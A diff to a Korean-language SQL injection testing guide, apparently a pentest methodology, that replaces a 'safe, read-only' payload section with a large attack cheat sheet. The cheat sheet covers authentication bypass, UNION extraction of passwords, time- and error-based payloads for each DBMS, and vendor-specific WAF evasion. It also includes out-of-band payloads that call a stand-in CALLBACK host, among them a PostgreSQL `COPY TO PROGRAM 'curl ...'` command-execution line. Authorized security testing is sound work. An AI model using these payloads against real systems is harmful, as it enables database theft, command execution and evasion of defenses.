@@ -1,83 +1,109 @@
 ### Phase 2: 동적 테스트 (검증)
 
+**기본 페이로드:**
 
-**테스트 방법:**
-1. curl로 SQL Injection 페이로드가 포함된 요청을 전송
-2. 응답에서 SQL 에러 메시지, 데이터 유출, 또는 비정상적인 동작을 확인
-
-**안전한 페이로드 (읽기 전용, 데이터 변경 없음):**
-
-Classic SQLi 테스트:
-- `' OR '1'='1` — 기본 Boolean 테스트
-- `' OR '1'='1' --` — 주석으로 나머지 쿼리 무효화
+**Classic SQLi (Boolean / UNION):**
+- `' OR '1'='1` — Boolean (query/body)
+- `' OR '1'='1' --` — 주석으로 나머지 무효화
+- `' OR 1=1#` — `#` 주석 (MySQL)
+- `admin'--` / `admin'#` — 인증 우회 (username 필드)
 - `1 UNION SELECT NULL,NULL,NULL --` — 컬럼 수 확인
-- `' AND 1=1 --` / `' AND 1=2 --` — Boolean 기반 (응답 차이 비교)
+- `1 UNION SELECT NULL,version(),NULL --` — 데이터 추출
+- `' AND 1=1 --` vs `' AND 1=2 --` — Boolean diff
 
-Blind SQLi 테스트:
-- `' AND SLEEP(3) --` (MySQL) — 시간 기반
-- `' AND pg_sleep(3) --` (PostgreSQL) — 시간 기반
-- `'; WAITFOR DELAY '0:0:3' --` (MSSQL) — 시간 기반
+**Blind SQLi — Time-based (DBMS별):**
 
-Error 기반:
-- `'` — 단일 따옴표로 SQL 에러 유발 여부 확인
-- `1'` — 숫자 파라미터에 따옴표 삽입
+| DBMS | 페이로드 |
+|---|---|
+| MySQL | `' AND SLEEP(3)--`, `' OR (SELECT BENCHMARK(5000000,MD5(1)))--`, `1' AND IF(1=1,SLEEP(3),0)--` |
+| PostgreSQL | `' AND pg_sleep(3)--`, `'; SELECT pg_sleep(3)--` |
+| MSSQL | `'; WAITFOR DELAY '0:0:3'--`, `1' AND 1=(SELECT 1 WHERE 1=1 WAITFOR DELAY '0:0:3')--` |
+| Oracle | `' AND DBMS_PIPE.RECEIVE_MESSAGE('a',3)=1--` |
+| SQLite | `' AND randomblob(100000000) IS NULL--` (CPU bound) |
 
-**curl 예시:**
-```
-# 기본 Boolean 테스트
-curl "https://target.com/api/users?id=1'+OR+'1'%3D'1"
+**Error-based (정보 추출):**
 
-# 시간 기반 Blind 테스트
-curl "https://target.com/api/users?id=1'+AND+SLEEP(3)+--+"
+| DBMS | 페이로드 |
+|---|---|
+| MySQL | `' AND extractvalue(1,concat(0x7e,version()))--`, `' OR updatexml(1,concat(0x7e,(SELECT user())),0)--` |
+| PostgreSQL | `' AND CAST((SELECT version()) AS int)--`, `'; SELECT 1/0--` |
+| MSSQL | `' AND 1=convert(int,@@version)--` |
+| Oracle | `' AND 1=utl_inaddr.get_host_name((SELECT user FROM dual))--` |
 
-# 에러 유발 테스트
-curl "https://target.com/api/users?id=1'"
-```
+**OOB (Out-of-band):**
 
-**WAF 우회 페이로드 (기본 페이로드 차단 시):**
-```
-# 인라인 주석 (MySQL)
-curl "https://target.com/api/users?id=1'/*!50000OR*/'1'%3D'1"
+| DBMS | 페이로드 |
+|---|---|
+| MySQL | `' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.CALLBACK\\\\x'))--` |
+| PostgreSQL | `'; COPY (SELECT '') TO PROGRAM 'curl https://CALLBACK/x'--` (superuser) |
+| MSSQL | `'; EXEC master..xp_dirtree '\\\\CALLBACK\\share'--` |
+| Oracle | `' AND UTL_HTTP.request('https://CALLBACK/x') IS NOT NULL--`, `UTL_INADDR.get_host_name('CALLBACK')` |
 
-# 공백 대체 (%09 탭, %0a 줄바꿈)
-curl "https://target.com/api/users?id=1'%09OR%091%3D1--"
+**ORDER BY / LIMIT / 식별자 위치:**
+- `(CASE WHEN 1=1 THEN id ELSE name END)` — Boolean 정렬 차이
+- `(SELECT 1 FROM (SELECT SLEEP(3))a)` — Time MySQL ORDER BY 서브쿼리
+- `1, IF(1=1,SLEEP(3),0)` — MySQL 다중 컬럼
+- `1; WAITFOR DELAY '0:0:3'--` — MSSQL stacked
+- `1 PROCEDURE ANALYSE(EXTRACTVALUE(...,...))` — MySQL 5.x 에러 추출
 
-# 대소문자 혼합
-curl "https://target.com/api/users?id=1'+oR+'1'%3D'1"
+**LIKE 와일드카드 데이터 릭:**
+- `?filter[email]=%@naver.com` (query) — 도메인별 사용자 식별
+- `?filter[bank_account]=%` — 전체 계좌
+- `?q=admin%` — prefix 매칭
 
-# Double encoding
-curl "https://target.com/api/users?id=1%2527+OR+%25271%2527%253D%25271"
+**2차 SQLi:**
+- 1차: 닉네임/프로필에 `a' OR SLEEP(3)-- a` 저장
+- 2차: 관리자 조회 등 raw query로 재사용 endpoint 호출 → 지연/에러 관찰
 
-# CONCAT/CHR 함수로 문자열 생성 (키워드 필터 우회)
-curl "https://target.com/api/users?id=1'+AND+1%3DCONVERT(INT,CHAR(49))--"
+**MyBatis `${}` 환경 (Java/Kotlin):**
+- 정렬 파라미터: `?sort=id) UNION SELECT password FROM users--`
+- IN 절: `?ids=1) OR 1=1--`
 
-# 과학적 표기법 (숫자 필터 우회)
-curl "https://target.com/api/users?id=0e1'+union+select+null,null--"
-```
+---
 
-**JSON 바디 테스트 (REST API):**
-```
-curl -X POST "https://target.com/api/users/search" \
-  -H "Content-Type: application/json" \
-  -d '{"id":"1'\'' OR '\''1'\''='\''1"}'
+**우회 페이로드:**
 
-# 숫자 파라미터
-curl -X POST "https://target.com/api/users/search" \
-  -H "Content-Type: application/json" \
-  -d '{"id":"1 AND SLEEP(3)"}'
-```
+| 방어 | 페이로드 |
+|---|---|
+| 키워드 블랙리스트 (`SELECT`, `UNION`) | 대소문자 `SeLeCt`, 인라인 주석 `/*!50000SELECT*/`, 분할 `SEL/**/ECT`, `UNI%0bON`, `unION` |
+| 키워드 블랙리스트 (강화) | HEX `0x53454c454354`, `CHAR(83,69,76,69,67,84)`, `CONCAT(CHAR(83),CHAR(69),...)` |
+| `'` 차단 | 더블쿼트 `"`, `\'`, `%27`, double-encoded `%2527`, GBK `0xbf27` (CVE-2006-2753) |
+| `'` 차단 + 숫자 컨텍스트 | 따옴표 불필요 — `1 OR 1=1`, `1 AND SLEEP(3)` |
+| 공백 차단 | `+`, `(`, `%09` (TAB), `%0a` (LF), `%0b` (VT), `%a0` (NBSP), `/**/`, `--%0a` |
+| AND/OR 차단 | `&&` (=AND), `\|\|` (=OR ANSI/Oracle), `XOR` |
+| `;` stacked 차단 | 트리거/뷰/function 정의로 간접 실행, MSSQL `xp_cmdshell` 결합 |
+| `union` 차단 | `UNI/**/ON`, `union all`, subquery `(SELECT ...)`, JOIN 트릭 |
+| URL 인코딩 차단 | Double encoding `%2527`, Unicode `%u0027`, UTF-8 overlong |
+| 길이 제한 | `'OR 1#` (5자), `1)OR 1#`, `'or'1` |
+| 컬럼명/테이블명 검증 | `information_schema` 대신 `mysql.innodb_table_stats` (MySQL), `pg_catalog.pg_tables` (PG) |
+| `addslashes` (PHP, Multibyte) | `0xbf27` 같은 GBK/SJIS multibyte 시퀀스 |
+| WAF 정규식 (`SELECT FROM`) | `SELECT/*x*/FROM`, `SELECT(*)FROM`, `SELECT''FROM` |
+| Stacked query 드라이버 차단 | trigger/view 정의로 후속 실행 |
 
-**응답 분석 기준:**
+**컨텍스트 변형:**
+- JSON body: `{"id":"1' OR '1'='1"}`
+- multipart: form-data field에 페이로드
+- Header (User-Agent/Referer 로깅 sink): `User-Agent: ' OR SLEEP(3)--`
+- Cookie sink: `Cookie: track_id=' OR 1=1--`
 
-| 응답 유형 | 판단 |
-|-----------|------|
-| SQL 에러 문자열: `syntax error`, `ORA-`, `MySQL`, `Unclosed quotation mark`, `pg_query` | 확인됨 (Error-based) |
-| Boolean 참/거짓 조건에서 응답 길이/내용 유의미한 차이 | 확인됨 (Boolean-based) |
-| Time-based: 기준선 대비 3초+ 지연 (3회 반복 일관) | 확인됨 (Time-based) |
-| UNION SELECT로 추가 데이터 반환 | 확인됨 (UNION-based) |
-| 400 Bad Request + `invalid input syntax` | 안전 (파라미터화된 쿼리, 타입 검증) |
-| 입력이 그대로 반영된 에러 (SQL 실행 아닌 입력 표시) | 안전 |
-| WAF 차단 (403 + 보안 벤더 시그니처) | 우회 기법 시도 |
+**WAF 벤더별:**
+- Cloudflare: `/*!50000SELECT*/`, double URL encoding, `/*//*/UNION/*//*/SELECT`
+- AWS WAF: `''=''`, `1.0=1`, JSON inline 변형
+- ModSecurity OWASP CRS: `1'/**/AND/**/1=1--`, paranoia level 의존
 
-**검증 기준:**
-- **확인됨**: 동적 테스트로 SQL 에러 메시지가 반환되거나 Boolean/Time 기반으로 쿼리 조작이 확인됨
+---
+
+**참고사항:**
+
+- ORDER BY/LIMIT/식별자 위치는 컬럼명이라 quote 불필요 — WAF 검증 빈약, 자주 발견
+- WHERE IN, JSON 경로, MyBatis `${}` 위치는 라이브러리 검증이 약해 자주 노출
+- POST body가 GET query보다 WAF 정규식 검증 약한 경우 다수
+- Time-based는 BENCHMARK가 SLEEP보다 일부 환경에서 안정적 (CPU bound, 지터 적음)
+- OOB는 외부 콜백 인프라(Burp Collaborator, interactsh) 필요 — 사전 승인 후 사용
+- 인증된 사용자만 접근 가능한 API가 비인증 API보다 검증 느슨한 경우 다수 — 세션 획득 후 우선 시도
+- 관리자 화면의 검색/필터/정렬 파라미터는 검증 누락 빈도 높음
+- 응답 본문 크기 차이 1바이트도 Boolean 신호 (`Content-Length` 비교)
+- Time-based 측정은 기준선 3회 + 페이로드 3회 + 일관 지연 확인 (네트워크 지터 배제)
+- DBMS 식별: 에러 메시지 `ORA-`(Oracle), `pg_query`(PG), `MySQL syntax`(MySQL), `Unclosed quotation mark`(MSSQL)
+- WAF 차단(403 + 보안 벤더 시그니처)은 안전이 아닌 "우회 시도 필요" 신호
+- `' OR '1'='1`이 차단되면 `' OR 1#` 같은 짧은 변형 우선 시도 (필터 회피)
